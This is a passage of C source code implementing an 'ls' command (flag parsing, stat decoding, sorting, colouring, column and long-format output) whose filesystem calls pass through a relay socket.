    int64_t ret = relay_fstatat_flags(sock, full_path, statbuf, sizeof(statbuf), flags);
    if (ret < 0) return -1;

    e->st_dev     = unpack_u64(statbuf + 0);
    e->st_ino     = unpack_u64(statbuf + 8);
    e->st_mode    = unpack_u32(statbuf + 16);
    e->st_nlink   = unpack_u32(statbuf + 20);
    e->st_uid     = unpack_u32(statbuf + 24);
    e->st_gid     = unpack_u32(statbuf + 28);
    e->st_rdev    = unpack_u64(statbuf + 32);
    e->st_size    = unpack_u64(statbuf + 48);
    e->st_blocks  = unpack_u64(statbuf + 64);
    e->st_atime   = unpack_u64(statbuf + 72);
    e->st_mtime   = unpack_u64(statbuf + 88);
    e->st_mtime_nsec = unpack_u64(statbuf + 96);
    e->st_ctime   = unpack_u64(statbuf + 104);
    e->has_stat   = 1;

    /* Read symlink target if it's a symlink */
    if ((e->st_mode & 0xF000) == 0xA000) {
        int64_t lr = relay_readlinkat(sock, full_path, e->link_target,
                                      sizeof(e->link_target) - 1);
        if (lr > 0) {
            e->link_target[lr] = '\0';
            e->has_link_target = 1;
        }
    }
    return 0;
}

/* Get the time value to use for display/sort based on flags */
static uint64_t ls_entry_time(const struct ls_entry *e, const struct ls_flags *f) {
    if (f->time_ctime) return e->st_ctime;
    if (f->time_atime) return e->st_atime;
    return e->st_mtime;
}

/* Get extension (pointer past last '.' or NULL if no extension) */
static const char *ls_get_ext(const char *name) {
    const char *dot = NULL;
    for (const char *p = name; *p; p++) {
        if (*p == '.') dot = p + 1;
    }
    /* No dot, or dot is first char (hidden file), or trailing dot */
    if (!dot || dot == name + 1 || *dot == '\0') return "";
    return dot;
}

/* Type indicator character for -F */
static char ls_type_indicator(const struct ls_entry *e) {
    if (e->has_stat) {
        uint32_t ft = e->st_mode & 0xF000;
        if (ft == 0x4000) return '/';    /* directory */
        if (ft == 0xA000) return '@';    /* symlink */
        if (ft == 0x1000) return '|';    /* FIFO */
        if (ft == 0xC000) return '=';    /* socket */
        if (ft == 0x8000 && (e->st_mode & 0111)) return '*'; /* executable */
    } else {
        if (e->dtype == DT_DIR)  return '/';
        if (e->dtype == DT_LNK) return '@';
        if (e->dtype == DT_FIFO) return '|';
        if (e->dtype == DT_SOCK) return '=';
    }
    return '\0';
}

/* ── ls ANSI color codes ─────────────────────────────────────────────────── */

/* Returns ANSI color code string for entry; empty string if no color */
static const char *ls_color_code(const struct ls_entry *e) {
    if (!e->has_stat) {
        switch (e->dtype) {
            case DT_DIR:  return "\033[1;34m";  /* bold blue */
            case DT_LNK:  return "\033[1;36m";  /* bold cyan */
            case DT_FIFO: return "\033[33m";     /* yellow */
            case DT_SOCK: return "\033[1;35m";  /* bold purple */
            case DT_CHR:
            case DT_BLK:  return "\033[1;33m";  /* bold yellow */
            default:      return "";
        }
    }
    uint32_t ft = e->st_mode & 0xF000;
    /* Symlink — cyan for valid, red for broken */
    if (ft == 0xA000) {
        return "\033[1;36m"; /* bold cyan */
    }
    /* Directory */
    if (ft == 0x4000) {
        /* Sticky + other-writable: green background */
        if ((e->st_mode & 01000) && (e->st_mode & 002))
            return "\033[30;42m";
        /* Other-writable: blue on green */
        if (e->st_mode & 002)
            return "\033[34;42m";
        /* Sticky: white on blue */
        if (e->st_mode & 01000)
            return "\033[37;44m";
        return "\033[1;34m"; /* bold blue */
    }
    /* SUID */
    if (e->st_mode & 04000) {
        if (ft == 0x8000) return "\033[37;41m"; /* white on red */
        return "\033[31m";
    }
    /* SGID */
    if (e->st_mode & 02000) {
        if (ft == 0x8000) return "\033[30;43m"; /* black on yellow */
    }
    /* Block/char device */
    if (ft == 0x6000 || ft == 0x2000) return "\033[1;33m"; /* bold yellow */
    /* FIFO */
    if (ft == 0x1000) return "\033[33m"; /* yellow */
    /* Socket */
    if (ft == 0xC000) return "\033[1;35m"; /* bold purple */
    /* Executable */
    if (ft == 0x8000 && (e->st_mode & 0111)) return "\033[1;32m"; /* bold green */

    return "";
}

/* ── ls name formatting (escaping) ───────────────────────────────────────── */

/* Write escaped name to stdout. Returns displayed width (for column calc). */
static int ls_print_name(const struct ls_entry *e, const struct ls_flags *f) {
    int use_color = (f->color == 1); /* always; auto not possible in relay */
    const char *color = "";
    const char *reset = "\033[0m";
    if (use_color) {
        color = ls_color_code(e);
        if (color[0]) printf("%s", color);
    }

    int width = 0;
    const char *name = e->name;
    for (const char *p = name; *p; p++) {
        unsigned char c = (unsigned char)*p;
        if (f->escape_nongraphic && (c < 0x20 || c == 0x7f)) {
            /* C-style escape */
            switch (c) {
                case '\n': printf("\\n"); width += 2; break;
                case '\r': printf("\\r"); width += 2; break;
                case '\t': printf("\\t"); width += 2; break;
                case '\a': printf("\\a"); width += 2; break;
                case '\b': printf("\\b"); width += 2; break;
                case '\f': printf("\\f"); width += 2; break;
                case '\v': printf("\\v"); width += 2; break;
                case 0x1b: printf("\\e"); width += 2; break;
                default:   printf("\\%03o", c); width += 4; break;
            }
        } else if (f->unprintable_q && c < 0x20) {
            putchar('?');
            width++;
        } else {
            putchar(*p);
            width++;
        }
    }

    if (use_color && color[0]) printf("%s", reset);

    return width;
}

/* ── ls sort comparators ─────────────────────────────────────────────────── */

/* Global pointer for comparators to access flags (qsort has no context arg) */
static const struct ls_flags *g_ls_sort_flags = NULL;

static int ls_cmp_name(const void *a, const void *b) {
    return strcmp(((const struct ls_entry *)a)->name,
                 ((const struct ls_entry *)b)->name);
}

static int ls_cmp_name_rev(const void *a, const void *b) {
    return strcmp(((const struct ls_entry *)b)->name,
                 ((const struct ls_entry *)a)->name);
}

static int ls_cmp_size(const void *a, const void *b) {
    const struct ls_entry *ea = (const struct ls_entry *)a;
    const struct ls_entry *eb = (const struct ls_entry *)b;
    if (eb->st_size > ea->st_size) return 1;
    if (eb->st_size < ea->st_size) return -1;
    return strcmp(ea->name, eb->name); /* stable tie-break */
}

static int ls_cmp_size_rev(const void *a, const void *b) {
    return ls_cmp_size(b, a);
}

static int ls_cmp_time(const void *a, const void *b) {
    const struct ls_entry *ea = (const struct ls_entry *)a;
    const struct ls_entry *eb = (const struct ls_entry *)b;
    uint64_t ta = ls_entry_time(ea, g_ls_sort_flags);
    uint64_t tb = ls_entry_time(eb, g_ls_sort_flags);
    if (tb > ta) return 1;
    if (tb < ta) return -1;
    return strcmp(ea->name, eb->name);
}

static int ls_cmp_time_rev(const void *a, const void *b) {
    return ls_cmp_time(b, a);
}

static int ls_cmp_ext(const void *a, const void *b) {
    const char *ea = ls_get_ext(((const struct ls_entry *)a)->name);
    const char *eb = ls_get_ext(((const struct ls_entry *)b)->name);
    int r = strcmp(ea, eb);
    if (r != 0) return r;
    return strcmp(((const struct ls_entry *)a)->name,
                 ((const struct ls_entry *)b)->name);
}

static int ls_cmp_ext_rev(const void *a, const void *b) {
    return ls_cmp_ext(b, a);
}

/* ── ls directories-first wrapper ───────────────────────────────────────── */

/* Stored inner comparator for the dirs-first wrapper to delegate to */
static int (*g_ls_inner_cmp)(const void *, const void *) = NULL;

/* Check if an ls_entry is a directory: prefer stat st_mode, fall back to dtype */
static int ls_entry_is_dir(const struct ls_entry *e) {
    if (e->has_stat) return (e->st_mode & 0xF000) == 0x4000;
    return e->dtype == DT_DIR;
}

static int ls_cmp_dirs_first_wrapper(const void *a, const void *b) {
    int da = ls_entry_is_dir((const struct ls_entry *)a);
    int db = ls_entry_is_dir((const struct ls_entry *)b);
    if (da != db) return db - da;  /* dirs first: db=1,da=0 -> -1 (a after b) */
    if (g_ls_inner_cmp) return g_ls_inner_cmp(a, b);
    return ls_cmp_name(a, b);
}

/* ── ls column output helpers ────────────────────────────────────────────── */

/* Compute display widths for all entries; returns max width */
static int ls_compute_widths(struct ls_entry *entries, int count,
                             const struct ls_flags *f, int *widths) {
    int max_w = 0;
    for (int i = 0; i < count; i++) {
        int w = (int)strlen(entries[i].name);
        if (f->show_inode && entries[i].has_stat) {
            char ibuf[24];
            snprintf(ibuf, sizeof(ibuf), "%llu ", (unsigned long long)entries[i].st_ino);
            w += (int)strlen(ibuf);
        }
        if (f->show_blocks && entries[i].has_stat) {
            char bbuf[24];
            int bs = f->block_size > 0 ? f->block_size : 1024;
            uint64_t blocks_kb = (entries[i].st_blocks * 512 + (uint64_t)bs - 1) / (uint64_t)bs;
            snprintf(bbuf, sizeof(bbuf), "%llu ", (unsigned long long)blocks_kb);
            w += (int)strlen(bbuf);
        }
        if (f->append_type) {
            char ti = ls_type_indicator(&entries[i]);
            if (ti) w++;
        } else if (f->append_slash && entries[i].has_stat &&
                   (entries[i].st_mode & 0xF000) == 0x4000) {
            w++;
        } else if (f->append_slash && !entries[i].has_stat &&
                   entries[i].dtype == DT_DIR) {
            w++;
        }
        widths[i] = w;
        if (w > max_w) max_w = w;
    }
    return max_w;
}

/* Print one entry's prefix (inode, blocks) and name with suffix.
 * pad_to: if > 0, pad name field to this width. Returns nothing. */
static void ls_print_entry_short(const struct ls_entry *e, const struct ls_flags *f,
                                 int pad_to) {
    /* Inode prefix */
    if (f->show_inode) {
        if (e->has_stat)
            printf("%7llu ", (unsigned long long)e->st_ino);
        else
            printf("      ? ");
    }
    /* Blocks prefix */
    if (f->show_blocks) {
        if (e->has_stat) {
            int bs = f->block_size > 0 ? f->block_size : 1024;
            uint64_t blocks_kb = (e->st_blocks * 512 + (uint64_t)bs - 1) / (uint64_t)bs;
            printf("%4llu ", (unsigned long long)blocks_kb);
        } else {
            printf("   ? ");
        }
    }

    /* Name with color */
    int name_width = ls_print_name(e, f);

    /* Type indicator suffix */
    char suffix = '\0';
    if (f->append_type) {
        suffix = ls_type_indicator(e);
    } else if (f->append_slash) {
        int is_dir = 0;
        if (e->has_stat) is_dir = ((e->st_mode & 0xF000) == 0x4000);
        else is_dir = (e->dtype == DT_DIR);
        if (is_dir) suffix = '/';
    }
    if (suffix) {
        putchar(suffix);
        name_width++;
    }

    /* Padding for column mode */
    if (pad_to > 0) {
        int need = pad_to - name_width;
        for (int p = 0; p < need; p++) putchar(' ');
    }
}

/* Print entries in column layout (-C vertical, -x horizontal) */
static void ls_print_columns(struct ls_entry *entries, int count,
                              const struct ls_flags *f) {
    int term_width = (f->col_width > 0) ? f->col_width : 80;
    int *widths = (int *)malloc((size_t)count * sizeof(int));
    if (!widths) {
        /* Fallback: one per line */
        for (int i = 0; i < count; i++) {
            ls_print_entry_short(&entries[i], f, 0);
            putchar('\n');
        }
        return;
    }
    int max_w = ls_compute_widths(entries, count, f, widths);
    int col_w = max_w + 2; /* 2-space gap between columns */
    if (col_w < 1) col_w = 1;
    int ncols = term_width / col_w;
    if (ncols < 1) ncols = 1;
    int nrows = (count + ncols - 1) / ncols;

    for (int row = 0; row < nrows; row++) {
        for (int col = 0; col < ncols; col++) {
            int idx;
            if (f->fmt_across) {
                /* -x: horizontal fill (row-major) */
                idx = row * ncols + col;
            } else {
                /* -C: vertical fill (column-major) */
                idx = col * nrows + row;
            }
            if (idx >= count) break;

            int is_last_in_row = 0;
            /* Check if next column entry would exceed count */
            int next_idx;
            if (f->fmt_across)
                next_idx = row * ncols + col + 1;
            else
                next_idx = (col + 1) * nrows + row;
            if (col + 1 >= ncols || next_idx >= count)
                is_last_in_row = 1;

            ls_print_entry_short(&entries[idx], f, is_last_in_row ? 0 : col_w);
        }
        putchar('\n');
    }
    free(widths);
}

/* ── ls long format output ───────────────────────────────────────────────── */

static void ls_print_long(int sock, struct ls_entry *entries, int count,
                          const char *abs_path, const struct ls_flags *f) {
    /* Compute field widths for alignment */
    int max_nlink_w = 1, max_uid_w = 1, max_gid_w = 1, max_size_w = 1;
    int max_ino_w = 1, max_blk_w = 1;
    uint64_t total_blocks = 0;

    for (int i = 0; i < count; i++) {
        if (!entries[i].has_stat) continue;
        char tmp[32];
        snprintf(tmp, sizeof(tmp), "%u", entries[i].st_nlink);
        int w = (int)strlen(tmp);
        if (w > max_nlink_w) max_nlink_w = w;

        /* UID width */
        if (f->numeric_ids || !f->fmt_long) {
            snprintf(tmp, sizeof(tmp), "%u", entries[i].st_uid);
        } else {
            const char *uname = uid_name(entries[i].st_uid);
            if (uname) snprintf(tmp, sizeof(tmp), "%s", uname);
            else snprintf(tmp, sizeof(tmp), "%u", entries[i].st_uid);
        }
        w = (int)strlen(tmp);
        if (w > max_uid_w) max_uid_w = w;

        /* GID width */
        if (f->numeric_ids || !f->fmt_long) {
            snprintf(tmp, sizeof(tmp), "%u", entries[i].st_gid);
        } else {
            const char *gname = uid_name(entries[i].st_gid);
            if (gname) snprintf(tmp, sizeof(tmp), "%s", gname);
            else snprintf(tmp, sizeof(tmp), "%u", entries[i].st_gid);
        }
        w = (int)strlen(tmp);
        if (w > max_gid_w) max_gid_w = w;

        /* Size width */
        if (f->human_readable) {
            char hbuf[16];
            format_size_human(entries[i].st_size, hbuf, sizeof(hbuf));
            w = (int)strlen(hbuf);
        } else {
            snprintf(tmp, sizeof(tmp), "%llu", (unsigned long long)entries[i].st_size);
            w = (int)strlen(tmp);
        }
        if (w > max_size_w) max_size_w = w;

        /* Inode width */
        if (f->show_inode) {
            snprintf(tmp, sizeof(tmp), "%llu", (unsigned long long)entries[i].st_ino);
            w = (int)strlen(tmp);
            if (w > max_ino_w) max_ino_w = w;
        }

        /* Blocks width */
        if (f->show_blocks) {
            int bs = f->block_size > 0 ? f->block_size : 1024;
            uint64_t bk = (entries[i].st_blocks * 512 + (uint64_t)bs - 1) / (uint64_t)bs;
            snprintf(tmp, sizeof(tmp), "%llu", (unsigned long long)bk);
            w = (int)strlen(tmp);
            if (w > max_blk_w) max_blk_w = w;
        }

        total_blocks += entries[i].st_blocks;
    }

    /* Total line — show blocks in units of block_size (default 1024) */
    {
        int bs = f->block_size > 0 ? f->block_size : 1024;
        uint64_t total_kb = (total_blocks * 512 + (uint64_t)bs - 1) / (uint64_t)bs;
        printf("total %llu\n", (unsigned long long)total_kb);
    }

    for (int i = 0; i < count; i++) {
        if (g_sigint) break;

        char full_path[CWD_SIZE];
        ls_make_full_path(abs_path, entries[i].name, full_path);

        if (!entries[i].has_stat) {
            char type_ch = '?';
            switch (entries[i].dtype) {
                case DT_DIR:  type_ch = 'd'; break;
                case DT_REG:  type_ch = '-'; break;
                case DT_LNK:  type_ch = 'l'; break;
                case DT_CHR:  type_ch = 'c'; break;
                case DT_BLK:  type_ch = 'b'; break;
                case DT_SOCK: type_ch = 's'; break;
                case DT_FIFO: type_ch = 'p'; break;
            }
            /* Inode prefix */
            if (f->show_inode) printf("%*s ", max_ino_w, "?");
            if (f->show_blocks) printf("%*s ", max_blk_w, "?");
            printf("%c?????????  %*s %*s %*s %*s ? ",
                   type_ch, max_nlink_w, "?", max_uid_w, "?",
                   max_gid_w, "?", max_size_w, "?");
            ls_print_name(&entries[i], f);
            printf("\n");
            continue;
        }

        /* Inode prefix */
        if (f->show_inode) {
            printf("%*llu ", max_ino_w, (unsigned long long)entries[i].st_ino);
        }

        /* Blocks prefix */
        if (f->show_blocks) {
            int bs = f->block_size > 0 ? f->block_size : 1024;
            uint64_t bk = (entries[i].st_blocks * 512 + (uint64_t)bs - 1) / (uint64_t)bs;
            printf("%*llu ", max_blk_w, (unsigned long long)bk);
        }

        /* Mode string */
        char mode_str[12];
        format_mode(entries[i].st_mode, mode_str);
        printf("%s ", mode_str);

        /* Nlink */
        printf("%*u ", max_nlink_w, entries[i].st_nlink);

        /* Owner — omit for -g */
        if (!f->no_owner) {
            if (f->numeric_ids) {
                printf("%*u ", max_uid_w, entries[i].st_uid);
            } else {
                const char *uname = uid_name(entries[i].st_uid);
                if (uname)
                    printf("%-*s ", max_uid_w, uname);
                else
                    printf("%*u ", max_uid_w, entries[i].st_uid);
            }
        }

        /* Group — omit for -o */
        if (!f->no_group) {
            if (f->numeric_ids) {
                printf("%*u ", max_gid_w, entries[i].st_gid);
            } else {
                const char *gname = uid_name(entries[i].st_gid);
                if (gname)
                    printf("%-*s ", max_gid_w, gname);
                else
                    printf("%*u ", max_gid_w, entries[i].st_gid);
            }
        }

        /* SELinux context (between group and size in long format) */
        if (f->show_selinux) {
            char ctx[256] = "?";
            relay_lgetxattr(sock, full_path, "security.selinux",
                            ctx, sizeof(ctx) - 1);
            size_t cl = strlen(ctx);
            if (cl > 0 && ctx[cl - 1] == '\0') ctx[cl - 1] = '\0';
            printf("%-30s ", ctx);
        }

        /* Size — for device files show major,minor */
        uint32_t ft = entries[i].st_mode & 0xF000;
        if ((ft == 0x2000 || ft == 0x6000) && entries[i].st_rdev != 0) {
            unsigned int major = (unsigned int)((entries[i].st_rdev >> 8) & 0xFFF);
            unsigned int minor = (unsigned int)(entries[i].st_rdev & 0xFF);
            minor |= (unsigned int)((entries[i].st_rdev >> 12) & 0xFFF00);
            printf("%4u, %4u ", major, minor);
        } else if (f->human_readable) {
            char hbuf[16];
            format_size_human(entries[i].st_size, hbuf, sizeof(hbuf));
            printf("%*s ", max_size_w, hbuf);
        } else {
            printf("%*llu ", max_size_w, (unsigned long long)entries[i].st_size);
        }

        /* Time */
        uint64_t display_time = ls_entry_time(&entries[i], f);
        if (f->full_time) {
            /* --full-time / -ll: "YYYY-MM-DD HH:MM:SS.NNNNNNNNN" */
            time_t t = (time_t)display_time;
            struct tm *tm = localtime(&t);
            char tbuf[48];
            if (tm) {
                strftime(tbuf, sizeof(tbuf), "%Y-%m-%d %H:%M:%S", tm);
                printf("%s.%09llu ", tbuf,
                       (unsigned long long)entries[i].st_mtime_nsec);
            } else {
                printf("%llu ", (unsigned long long)display_time);
            }
        } else {
            char time_str[32];
            format_time(display_time, time_str, sizeof(time_str));
            printf("%s ", time_str);
        }

        /* Name */
        ls_print_name(&entries[i], f);

        /* Type indicator */
        if (f->append_type) {
            char ti = ls_type_indicator(&entries[i]);
            if (ti) putchar(ti);
        } else if (f->append_slash &&
                   (entries[i].st_mode & 0xF000) == 0x4000) {
            putchar('/');
        }

        /* Symlink target */
        if (entries[i].has_link_target) {
            printf(" -> ");
            if (f->color == 1) {
                /* Color the symlink target too */
                printf("%s", entries[i].link_target);
            } else {
                printf("%s", entries[i].link_target);
            }
        }
        printf("\n");
    }
}

/* ── ls_one_dir — core directory listing engine ──────────────────────────── */

static int ls_one_dir(int sock, const char *abs_path, const struct ls_flags *f);

static int cmd_ls(int sock, int argc, char *argv[]) {
    struct ls_flags f;
    memset(&f, 0, sizeof(f));
    f.block_size = 1024;
    /* Default: one-per-line (relay is never a tty) */
    f.fmt_one = 1;

    const char *paths[64];
    int path_count = 0;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] != '\0') {
            /* Check for --long-options */
            if (strncmp(argv[i], "--color", 7) == 0) {
                if (argv[i][7] == '\0' || strcmp(argv[i] + 7, "=always") == 0) {
                    f.color = 1;
                } else if (strcmp(argv[i] + 7, "=auto") == 0) {
                    f.color = 2; /* auto — effectively never in relay */
                } else if (strcmp(argv[i] + 7, "=never") == 0) {
                    f.color = 0;
                }
                continue;
            }
            if (strncmp(argv[i], "--block-size", 12) == 0) {
                if (argv[i][12] == '=') {
                    f.block_size = atoi(argv[i] + 13);
                } else if (i + 1 < argc) {
                    f.block_size = atoi(argv[++i]);
                }
                if (f.block_size < 1) f.block_size = 1024;
                continue;
            }
            if (strcmp(argv[i], "--full-time") == 0) {
                f.full_time = 1;
                f.fmt_long = 1;
                continue;
            }
            if (strcmp(argv[i], "--group-directories-first") == 0) {
                f.group_dirs_first = 1;
                continue;
            }
            if (strcmp(argv[i], "--help") == 0) {
                printf(
                    "usage: ls [-1ACFHLNRSUXZabcdfghiklmnopqrstuwx] "
                    "[--color[=auto]] [FILE...]\n\n"
                    "List files\n\n"
                    "what to show:\n"
                    "-A  all files except . and ..      -a  all files including .hidden\n"
                    "-b  escape nongraphic chars        -d  directory, not contents\n"
                    "-F  append /dir *exe @sym |FIFO    -f  files (no sort/filter/format)\n"
                    "-H  follow command line symlinks   -i  inode number\n"
                    "-L  follow symlinks                -N  no escaping, even on tty\n"
                    "-p  put '/' after dir names        -q  unprintable chars as '?'\n"
                    "-R  recursively list in subdirs    -s  storage used (1K blocks)\n"
                    "-Z  security context\n\n"
                    "output formats:\n"
                    "-1  list one file per line         -C  columns (sorted vertically)\n"
                    "-g  like -l but no owner           -h  human readable sizes\n"
                    "-k  reset --block-size to 1024     -l  long (show full details)\n"
                    "-m  comma separated                -ll long with nanoseconds\n"
                    "-n  long with numeric uid/gid      -o  long without group column\n"
                    "-r  reverse order                  -w  set column width\n"
                    "-x  columns (horizontal sort)\n\n"
                    "sort by:\n"
                    "-c  ctime      -r  reverse    -S  size     -t  time\n"
                    "-u  atime      -U  none       -X  extension\n\n"
                    "--block-size N  block size for -s (default 1024, -k resets)\n"
                    "--color  =always (default)  =auto  =never\n"
                    "--full-time  long format with nanosecond timestamps\n"
                    "--group-directories-first  (or !)  list directories before files\n"
                );
                return 0;
            }
            /* Skip unrecognized --long-options */
            if (argv[i][1] == '-') {
                fprintf(stderr, "ls: unrecognized option '%s'\n", argv[i]);
                continue;
            }
            /* Short flags */
            for (const char *ch = argv[i] + 1; *ch; ch++) {
                switch (*ch) {
                    case '1': f.fmt_one = 1; f.fmt_columns = 0;
                              f.fmt_across = 0; f.fmt_comma = 0;
                              f.fmt_long = 0; break;
                    case 'A': f.show_almost_all = 1; break;
                    case 'C': f.fmt_columns = 1; f.fmt_one = 0;
                              f.fmt_across = 0; f.fmt_comma = 0;
                              f.fmt_long = 0; break;
                    case 'F': f.append_type = 1; break;
                    case 'H': f.follow_cmdline = 1; break;
                    case 'L': f.follow_symlinks = 1; break;
                    case 'N': f.no_escape = 1; break;
                    case 'R': f.recursive = 1; break;
                    case 'S': f.sort_size = 1; break;
                    case 'U': f.sort_none = 1; break;
                    case 'X': f.sort_ext = 1; break;
                    case 'Z': f.show_selinux = 1; break;
                    case 'a': f.show_all = 1; break;
                    case 'b': f.escape_nongraphic = 1; break;
                    case 'c': f.time_ctime = 1; break;
                    case 'd': f.dir_itself = 1; break;
                    case 'f': f.unsorted = 1; f.show_all = 1; break;
                    case 'g': f.no_owner = 1; f.fmt_long = 1;
                              f.fmt_one = 0; f.fmt_columns = 0;
                              f.fmt_across = 0; f.fmt_comma = 0; break;
                    case 'h': f.human_readable = 1; break;
                    case 'i': f.show_inode = 1; break;
                    case 'k': f.block_size = 1024; break;
                    case 'l':
                        if (f.fmt_long) {
                            /* -ll = full time */
                            f.full_time = 1;
                        }
                        f.fmt_long = 1; f.fmt_one = 0;
                        f.fmt_columns = 0; f.fmt_across = 0;
                        f.fmt_comma = 0;
                        break;
                    case 'm': f.fmt_comma = 1; f.fmt_one = 0;
                              f.fmt_columns = 0; f.fmt_across = 0;
                              f.fmt_long = 0; break;
                    case 'n': f.numeric_ids = 1; f.fmt_long = 1;
                              f.fmt_one = 0; f.fmt_columns = 0;
                              f.fmt_across = 0; f.fmt_comma = 0; break;
                    case 'o': f.no_group = 1; f.fmt_long = 1;
                              f.fmt_one = 0; f.fmt_columns = 0;
                              f.fmt_across = 0; f.fmt_comma = 0; break;
                    case 'p': f.append_slash = 1; break;
                    case 'q': f.unprintable_q = 1; break;
                    case 'r': f.sort_reverse = 1; break;
                    case 's': f.show_blocks = 1; break;
                    case 't': f.sort_time = 1; break;
                    case 'u': f.time_atime = 1; break;
                    case 'w':
                        /* -w N: next arg or next chars */
                        if (ch[1] >= '0' && ch[1] <= '9') {
                            f.col_width = atoi(ch + 1);
                            /* Skip rest of this flag group */
                            while (ch[1]) ch++;
                        } else if (i + 1 < argc) {
                            f.col_width = atoi(argv[++i]);
                        }
                        break;
                    case 'x': f.fmt_across = 1; f.fmt_one = 0;
                              f.fmt_columns = 0; f.fmt_comma = 0;
                              f.fmt_long = 0; break;
                    case '!': f.group_dirs_first = 1; break;
                    default:
                        fprintf(stderr, "ls: unknown option '-%c'\n", *ch);
                        break;
                }
            }
        } else {
            if (path_count < 64)
                paths[path_count++] = argv[i];
        }
    }

    /* -f implies -a and no sort */
    if (f.unsorted) {
        f.show_all = 1;
        f.sort_size = 0;
        f.sort_time = 0;
        f.sort_ext = 0;
    }

    /* If no paths given, use cwd */
    if (path_count == 0) {
        paths[0] = NULL; /* sentinel for "use g_cwd" */
        path_count = 1;
    }

    int ret = 0;
    for (int pi = 0; pi < path_count; pi++) {
        if (g_sigint) break;

        char abs_path[CWD_SIZE];
        if (paths[pi]) {
            resolve_path(paths[pi], abs_path);
        } else {
            strncpy(abs_path, g_cwd, CWD_SIZE);
            abs_path[CWD_SIZE - 1] = '\0';
        }

        /* -H: follow symlink for command-line args */
        if (f.follow_cmdline && paths[pi]) {
            /* Stat with follow to see if it resolves */
            uint8_t sb[128];
            memset(sb, 0, sizeof(sb));
            if (relay_fstatat(sock, abs_path, sb, sizeof(sb)) >= 0) {
                /* Use followed stat */
            }
        }

        /* -d: show entry itself, don't descend */
        if (f.dir_itself) {
            /* Treat each path as a single entry */
            struct ls_entry e;
            memset(&e, 0, sizeof(e));
            const char *basename_p = strrchr(abs_path, '/');
            if (basename_p && basename_p[1])
                strncpy(e.name, basename_p + 1, 255);
            else
                strncpy(e.name, abs_path, 255);
            e.name[255] = '\0';

            ls_stat_entry(sock, abs_path, &e, f.follow_symlinks);

            if (f.fmt_long) {
                /* Use parent dir for the listing context */
                char parent[CWD_SIZE];
                strncpy(parent, abs_path, CWD_SIZE);
                parent[CWD_SIZE - 1] = '\0';
                char *slash = strrchr(parent, '/');
                if (slash && slash != parent) *slash = '\0';
                else if (slash) parent[1] = '\0';
                ls_print_long(sock, &e, 1, parent, &f);
            } else if (f.fmt_comma) {
                ls_print_name(&e, &f);
                if (f.append_type) {
                    char ti = ls_type_indicator(&e);
                    if (ti) putchar(ti);
                }
                printf("\n");
            } else {
                ls_print_entry_short(&e, &f, 0);
                printf("\n");
            }
            continue;
        }

        /* Multiple paths: print header */
        if (path_count > 1) {
            if (pi > 0) printf("\n");
            printf("%s:\n", abs_path);
        }

        ret |= ls_one_dir(sock, abs_path, &f);
    }
    return ret;
}

static int ls_one_dir(int sock, const char *abs_path, const struct ls_flags *f) {
    if (g_sigint) return 0;

    int64_t fd = relay_openat(sock, abs_path, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) {
        /* Maybe it's a file, not a directory — stat and display single entry */
        uint8_t sb[128];
        memset(sb, 0, sizeof(sb));
        uint64_t stat_flags = f->follow_symlinks ? 0 : MY_AT_SYMLINK_NOFOLLOW;
        if (relay_fstatat_flags(sock, abs_path, sb, sizeof(sb), stat_flags) >= 0) {
            uint32_t mode = unpack_u32(sb + 16);
            if ((mode & 0xF000) != 0x4000) {
                /* It's a file — display as single entry */
                struct ls_entry e;
                memset(&e, 0, sizeof(e));
                const char *bn = strrchr(abs_path, '/');
                if (bn && bn[1]) strncpy(e.name, bn + 1, 255);
                else strncpy(e.name, abs_path, 255);
                e.name[255] = '\0';

                char parent[CWD_SIZE];
                strncpy(parent, abs_path, CWD_SIZE);
                parent[CWD_SIZE - 1] = '\0';
                char *slash = strrchr(parent, '/');
                if (slash && slash != parent) *slash = '\0';
                else if (slash) parent[1] = '\0';

                ls_stat_entry(sock, abs_path, &e, f->follow_symlinks);
                if (f->fmt_long) {
                    ls_print_long(sock, &e, 1, parent, f);
                } else {
                    ls_print_entry_short(&e, f, 0);
                    printf("\n");
                }
                return 0;
            }
        }
        int e_code = (int)(-(int64_t)fd);
        fprintf(stderr, "ls: cannot open '%s': %s\n", abs_path, errno_str(e_code));
        return 1;
    }

    struct ls_entry *entries = NULL;
    int entry_count = 0;
    int entry_cap = 2048;
    entries = (struct ls_entry *)malloc((size_t)entry_cap * sizeof(struct ls_entry));
    if (!entries) {
        relay_close(sock, fd);
        fprintf(stderr, "ls: out of memory\n");
        return 1;
    }

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            uint8_t d_type = buf[pos + 18];
            const char *d_name = (const char *)(buf + pos + 19);

            if (d_reclen == 0) break;

            /* Filter . and .. based on flags */
            if (d_name[0] == '.') {
                if (!f->show_all && !f->show_almost_all) {
                    pos += d_reclen;
                    continue;
                }
                if (f->show_almost_all && !f->show_all) {
                    if (strcmp(d_name, ".") == 0 || strcmp(d_name, "..") == 0) {
                        pos += d_reclen;
                        continue;
                    }
                }
            }

            /* Grow array if needed */
            if (entry_count >= entry_cap) {
                entry_cap *= 2;
                struct ls_entry *newbuf = (struct ls_entry *)realloc(
                    entries, (size_t)entry_cap * sizeof(struct ls_entry));
                if (!newbuf) {
                    pos += d_reclen;
                    continue;
                }
                entries = newbuf;
            }

            memset(&entries[entry_count], 0, sizeof(struct ls_entry));
            strncpy(entries[entry_count].name, d_name, 255);
            entries[entry_count].name[255] = '\0';
            entries[entry_count].dtype = d_type;
            entry_count++;

            pos += d_reclen;
        }
    }
    relay_close(sock, fd);

    /* Stat all entries when needed */
    int need_stat = f->fmt_long || f->sort_size || f->sort_time || f->sort_ext ||
                    f->show_inode || f->show_blocks || f->append_type ||
                    f->show_selinux || f->color;
    if (need_stat) {
        for (int i = 0; i < entry_count; i++) {
            char full_path[CWD_SIZE];
            ls_make_full_path(abs_path, entries[i].name, full_path);
            ls_stat_entry(sock, full_path, &entries[i], f->follow_symlinks);
        }
    }

    /* Sort */
    g_ls_sort_flags = f;
    if (f->unsorted || f->sort_none) {
        /* No sorting — directory order (but dirs-first still applies) */
        if (f->group_dirs_first) {
            g_ls_inner_cmp = NULL;  /* preserve original order within groups */
            qsort(entries, (size_t)entry_count, sizeof(struct ls_entry),
                  ls_cmp_dirs_first_wrapper);
        }
    } else {
